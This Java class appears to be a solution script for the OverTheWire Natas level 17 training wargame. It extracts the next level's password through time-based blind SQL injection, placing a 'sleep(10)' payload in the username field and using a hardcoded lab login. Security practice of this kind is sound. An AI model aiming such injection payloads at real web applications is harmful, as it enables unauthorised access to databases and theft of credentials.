package net.leirahjelle.playground;

import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;

import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.stream.IntStream;

public class Natas17 extends NatasLevel {

    public Natas17() {
        super(4);
    }

    public Natas17(int threads) {
        super(threads);
    }

    @Override
    public String findPassword() throws InterruptedException, ExecutionException {
        String allCharacters = fromCharCode(IntStream.rangeClosed(38,127).toArray())
                .replace("%", "")
                .replace("_", "");
//        System.out.println("Looping characters: "+allCharacters);

        String password = "";
        String nextChar;
        do {
            System.out.print("\rCurrent password found: "+password);
            nextChar = "";
            List<NatasTask> natasTasks = new LinkedList<>();
            for (int i = 0; i < allCharacters.length(); i++) {
                NatasTask natasTask = createTask(password, allCharacters.charAt(i));
                natasTasks.add(natasTask);
            }
            nextChar = runTasks(natasTasks);
//            System.out.println(String.format("%nNext char in password: '%s'", nextChar));
            password += nextChar;

        } while (!nextChar.isEmpty());

        executor.shutdown();
        System.out.println("\nCompleted!");
        return password;
    }

    protected NatasTask createTask(String currentPassword, char charToTest) {
        try {
//        System.out.println("Testing: "+charToTest);
            String attempt = currentPassword + charToTest;
            CredentialsProvider provider = new BasicCredentialsProvider();
            provider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"));
            CloseableHttpClient httpClient = HttpClientBuilder.create()
                    .setDefaultCredentialsProvider(provider)
                    .build();

            URIBuilder builder = new URIBuilder("http://natas17.natas.labs.overthewire.org/index.php");
            builder.addParameter("debug", "true");
            builder.addParameter("username", "natas18\" and password like binary '"+ attempt +"%' and sleep(10)#");

            String uri = builder.build().toASCIIString();
//        System.out.println("Testing uri: "+uri);
//        System.out.println("Testing param: "+builder.getQueryParams());
            HttpGet request = new HttpGet(uri);

            return new NatasTask(httpClient, request, (HttpResponse response, long requestTime) -> {
                if (requestTime >= 10 * 1000) {
//                System.out.println("Got match for: "+charToTest);
                    return String.valueOf(charToTest);
                }
                return "";
            });
        } catch (Exception exception) {
            throw new RuntimeException("Failed to create task", exception);
        }
    }
}
